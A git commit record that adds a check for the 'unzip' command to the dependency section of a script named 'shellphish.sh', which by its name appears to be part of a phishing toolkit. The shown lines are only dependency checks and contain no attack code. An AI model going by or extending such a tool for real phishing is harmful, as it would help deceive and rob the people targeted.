d434ccd60c404434ad4a120b6a8e59eb2d621965
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2018-06-23 08:27:43 -0300

    Update shellphish.sh

--- shellphish.sh
+++ shellphish.sh
@@ -12,6 +12,7 @@ dependencies() {
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 
 }
 
